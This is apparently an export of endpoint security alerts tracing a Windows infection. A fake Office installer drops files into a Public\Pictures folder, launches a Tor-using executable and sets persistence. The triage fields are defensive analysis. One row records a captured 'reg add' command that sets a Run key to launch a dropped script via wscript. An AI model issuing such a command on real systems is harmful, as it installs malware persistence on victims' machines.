"Jun 1, 2026 @ 14:24:15.348",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\unverified-microdesc-consensus.tmp,,creation,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-3290448C
"Jun 1, 2026 @ 14:24:18.012",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\unverified-microdesc-consensus,,deletion,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-3FF36FD4
"Jun 1, 2026 @ 14:24:15.351",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\unverified-microdesc-consensus,,rename,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-8CDE67A5
"Jun 1, 2026 @ 14:24:15.825",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\cached-certs.tmp,,creation,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-CAFBDA2F
"Jun 1, 2026 @ 14:24:34.224",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\cached-microdescs.new,,creation,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-0F8FB670
"Jun 1, 2026 @ 14:22:04.649",C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe,C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe,microsoft-365-16-0-19725-20152.exe RELAUNCHED ,Malware Staging | Rare Parent-Child | Sigma Match,80,Rare process pair: microsoft-365-16-0-19725-20152.exe->microsoft-365-16-0-19725-20152.exe ; Execution from user-writable path: c:\users\dell\downloads\microsoft-365-16-0-19725-20152.exe ; Executable running from Users/ directory — possible dropper,,,,,,end,"33,012",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-0872E047
"Jun 1, 2026 @ 14:24:15.846",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\cached-certs,,rename,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-65573E81
"Jun 1, 2026 @ 14:22:04.927",C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe,C:\Windows\explorer.exe,"""C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe"" ",Malware Staging | Rare Parent-Child | Sigma Match,80,Rare process pair: explorer.exe->microsoft-365-16-0-19725-20152.exe ; Execution from user-writable path: c:\users\dell\downloads\microsoft-365-16-0-19725-20152.exe ; Executable running from Users/ directory — possible dropper,,,,,,end,"26,752",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-1FFBAB2B
"Jun 1, 2026 @ 14:24:49.769",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\state,,deletion,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-F7F7E68E
"Jun 1, 2026 @ 14:24:49.767",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\state.tmp,,creation,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-52283868
"Jun 1, 2026 @ 14:21:16.772",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,80,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\clview.exe\mitigationoptions ; Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\graph.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\clview.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-D0825639
"Jun 1, 2026 @ 14:22:02.433",C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe,C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe,"""C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe"" ELEVATED sid=S-1-5-21-3330616437-3750286687-2521933251-1001 RELAUNCHED ",Malware Staging | Rare Parent-Child | Sigma Match,80,Rare process pair: microsoft-365-16-0-19725-20152.exe->microsoft-365-16-0-19725-20152.exe ; Execution from user-writable path: c:\users\dell\downloads\microsoft-365-16-0-19725-20152.exe ; Executable running from Users/ directory — possible dropper,,,,,,end,"25,088",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-B8CB7B65
"Jun 1, 2026 @ 14:24:03.255",C:\Users\Public\Pictures\kelotopu\uusd.exe,C:\Windows\System32\wscript.exe,"""C:\Users\Public\Pictures\kelotopu\uusd.exe"" ",Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,,,start,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-FF635C19
"Jun 1, 2026 @ 14:24:18.086",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\cached-microdesc-consensus,,rename,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-583F6C83
"Jun 1, 2026 @ 14:23:25.848",C:\Windows\System32\reg.exe,,,LOLBin Abuse | Persistence | Rare Parent-Child,80,Rare process pair: -->reg.exe ; Living-off-the-land binary: reg.exe ; Persistence registry path: hklm\software\microsoft\windows\currentversion\run\xuvotopo,,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\xuvotopo,,,modification,"12,252",T1547.001,Registry Run Keys / Startup Folder,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-9A816A30
"Jun 1, 2026 @ 14:24:48.323",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\state.tmp,,creation,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-226BB071
"Jun 1, 2026 @ 14:24:48.327",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\state,,deletion,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-EF54AC35
"Jun 1, 2026 @ 14:24:04.303",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\state.tmp,,creation,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-A2F547FF
"Jun 1, 2026 @ 14:24:48.334",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\state,,rename,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-7A763644
"Jun 1, 2026 @ 14:21:40.978",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,75,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DF09945451CA6B549B.TMP,,deletion,"5,516",T1218,,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-6F60B70B
"Jun 1, 2026 @ 14:23:22.935",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.24.11321.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,LOLBin Abuse | Rare Parent-Child | Suspicious User-Agent / Tool,70,Rare process pair: windowsterminal.exe->powershell.exe ; Living-off-the-land binary: powershell.exe ; Tool signature in user-agent/command: powershell,,,,,,end,"7,884",T1059.001,PowerShell,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-2471283C
"Jun 1, 2026 @ 14:23:25.346",C:\Windows\System32\reg.exe,C:\Users\DELL\office_portable_x3.exe,"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v xuvotopo /t REG_SZ /d ""wscript.exe \""C:\Users\Public\Pictures\kelotopu\xuvotopo.js\"""" /f",LOLBin Abuse | Sigma Match,70,Living-off-the-land binary: reg.exe ; reg.exe adding a Run key entry,,,,,,start,"12,252",T1547.001,Registry Run Keys / Startup Folder,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-95B6821C
"Jun 1, 2026 @ 14:23:25.852",C:\Windows\System32\reg.exe,C:\Users\DELL\office_portable_x3.exe,"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v xuvotopo /t REG_SZ /d ""wscript.exe \""C:\Users\Public\Pictures\kelotopu\xuvotopo.js\"""" /f",LOLBin Abuse | Sigma Match,70,Living-off-the-land binary: reg.exe ; reg.exe adding a Run key entry,,,,,,end,"12,252",T1547.001,Registry Run Keys / Startup Folder,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-F99FA65F
"Jun 1, 2026 @ 14:21:37.792",C:\Windows\System32\msiexec.exe,C:\Windows\System32\services.exe,C:\Windows\system32\msiexec.exe /V,LOLBin Abuse | PowerShell Payload | Rare Parent-Child,65,Rare process pair: services.exe->msiexec.exe ; Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,start,"5,516",T1218,PowerShell,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-CECAAECE
"Jun 1, 2026 @ 14:23:20.968",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Public\Pictures\kelotopu\xuvotopo.js,,creation,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-F58331E7
"Jun 1, 2026 @ 14:23:20.794",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Public\Pictures\kelotopu\cinfo.inf,,creation,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-B5EF69CC
"Jun 1, 2026 @ 14:23:19.636",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Public\Pictures\kelotopu\002a.txt,,creation,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-2475A48C
"Jun 1, 2026 @ 14:23:19.389",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Public\Pictures\kelotopu\002w.txt,,creation,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-2654B171
"Jun 1, 2026 @ 14:23:19.383",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Public\Pictures\kelotopu\uusd.exe,,creation,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-6A88A6C1
"Jun 1, 2026 @ 14:23:17.642",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Public\Pictures\kelotopu\GUID,,creation,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-6DC90984
"Jun 1, 2026 @ 14:23:05.906",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-8A0C21C1
"Jun 1, 2026 @ 14:22:58.483",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_bz2.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-494F80A1
"Jun 1, 2026 @ 14:22:56.885",C:\Users\DELL\office_portable_x3.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Users\DELL\office_portable_x3.exe"" ",Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,start,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-6F9F9BAD
"Jun 1, 2026 @ 14:22:58.487",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_ctypes.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-B053B5BE
"Jun 1, 2026 @ 14:22:58.479",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\VCRUNTIME140.dll,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-AF5B0E5E
"Jun 1, 2026 @ 14:22:58.481",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\VCRUNTIME140_1.dll,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-2EE44A41
"Jun 1, 2026 @ 14:22:04.607",C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\downloads\microsoft-365-16-0-19725-20152.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\OTele\microsoft-365-16-0-19725-20152.exe.db-wal,,deletion,"33,012",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-3525F875
"Jun 1, 2026 @ 14:22:00.241",C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\downloads\microsoft-365-16-0-19725-20152.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\DESKTOP-MPJ4I7R-20260601-1416a.log,,overwrite,"25,088",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-354AC228
"Jun 1, 2026 @ 14:22:02.458",C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\downloads\microsoft-365-16-0-19725-20152.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\DESKTOP-MPJ4I7R-20260601-1416.log,,overwrite,"33,012",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-AD8B6C15
"Jun 1, 2026 @ 14:22:04.604",C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\downloads\microsoft-365-16-0-19725-20152.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\OTele\microsoft-365-16-0-19725-20152.exe.db-shm,,deletion,"33,012",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-8BB5EA4B
"Jun 1, 2026 @ 14:23:27.250",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\libcrypto-3.dll,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-6F319CEC
"Jun 1, 2026 @ 14:23:27.246",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\uusd.exe,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-4FA2F109
"Jun 1, 2026 @ 14:23:27.255",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\psutil\_psutil_windows.pyd,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-63E98772
"Jun 1, 2026 @ 14:23:27.264",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\unicodedata.pyd,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-C63C7E6E
"Jun 1, 2026 @ 14:23:27.260",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\python313.dll,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-B0079A45
"Jun 1, 2026 @ 14:23:27.263",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\select.pyd,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-B7ACC996
"Jun 1, 2026 @ 14:23:27.257",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\pyarmor_runtime_000000\pyarmor_runtime.pyd,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-7CADCE14
"Jun 1, 2026 @ 14:23:27.258",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\python3.dll,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-35DB7C61
"Jun 1, 2026 @ 14:23:27.245",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\pack.js,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-7EF0E4F0
"Jun 1, 2026 @ 14:23:27.241",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002a.txt,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-5BEB7D47
"Jun 1, 2026 @ 14:23:27.253",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\libffi-8.dll,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-2EFA0A3F
"Jun 1, 2026 @ 14:23:27.240",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002.xml,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-BEB2BEB4
"Jun 1, 2026 @ 14:23:21.976",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Public\Pictures\kelotopu\xuvotopo.xml,,creation,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-7302FC5D
"Jun 1, 2026 @ 14:23:26.917",C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,end,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-45558092
"Jun 1, 2026 @ 14:23:27.238",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\base_library.zip,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-AC6A0A42
"Jun 1, 2026 @ 14:23:05.885",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-B86526C3
"Jun 1, 2026 @ 14:23:05.048",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\python313.dll,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-F379EBAD
"Jun 1, 2026 @ 14:23:05.049",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\select.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-D19A1345
"Jun 1, 2026 @ 14:23:05.059",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\unicodedata.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-B79803E7
"Jun 1, 2026 @ 14:23:05.060",C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,start,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-DE25458E
"Jun 1, 2026 @ 14:23:04.980",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\libffi-8.dll,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-F8362D32
